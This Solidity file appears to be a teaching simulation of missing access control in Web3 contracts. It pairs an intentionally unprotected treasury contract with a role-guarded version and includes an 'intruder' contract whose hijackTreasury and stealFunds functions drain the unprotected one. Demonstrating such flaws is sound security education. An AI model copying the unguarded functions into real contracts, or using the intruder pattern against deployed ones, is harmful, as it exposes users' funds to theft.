// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title UnauthorizedAccessAttackDefense - Attack and Defense Simulation for Unauthorized Access in Web3 Smart Contracts
/// @author ChatGPT

/// @notice Insecure Access Control Contract (No Protection, Anyone Can Call)
contract InsecureAccessTarget {
    address public treasury;
    uint256 public balance;

    event TreasuryUpdated(address indexed newTreasury);
    event Withdrawn(address indexed to, uint256 amount);

    constructor() {
        treasury = msg.sender;
    }

    function updateTreasury(address newTreasury) external {
        treasury = newTreasury;
        emit TreasuryUpdated(newTreasury);
    }

    function withdrawAll(address payable to) external {
        uint256 amount = address(this).balance;
        (bool success, ) = to.call{value: amount}("");
        require(success, "Withdraw failed");
        emit Withdrawn(to, amount);
    }

    receive() external payable {
        balance += msg.value;
    }
}

/// @notice Secure Access-Controlled Contract (Strict Role Enforcement)
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

contract SecureAccessTarget is Ownable, AccessControl {
    bytes32 public constant TREASURER_ROLE = keccak256("TREASURER_ROLE");

    uint256 public balance;

    event TreasuryUpdated(address indexed admin);
    event Withdrawn(address indexed to, uint256 amount);

    constructor() {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(TREASURER_ROLE, msg.sender);
    }

    function updateTreasuryAdmin(address newAdmin) external onlyOwner {
        _grantRole(TREASURER_ROLE, newAdmin);
        emit TreasuryUpdated(newAdmin);
    }

    function withdrawAll(address payable to) external onlyRole(TREASURER_ROLE) {
        uint256 amount = address(this).balance;
        (bool success, ) = to.call{value: amount}("");
        require(success, "Withdraw failed");
        emit Withdrawn(to, amount);
    }

    receive() external payable {
        balance += msg.value;
    }
}

/// @notice Attack contract simulating unauthorized actions
contract UnauthorizedAccessIntruder {
    address public targetInsecure;

    constructor(address _targetInsecure) {
        targetInsecure = _targetInsecure;
    }

    function hijackTreasury(address fakeTreasury) external returns (bool success) {
        (success, ) = targetInsecure.call(
            abi.encodeWithSignature("updateTreasury(address)", fakeTreasury)
        );
    }

    function stealFunds(address payable thief) external returns (bool success) {
        (success, ) = targetInsecure.call(
            abi.encodeWithSignature("withdrawAll(address)", thief)
        );
    }
}
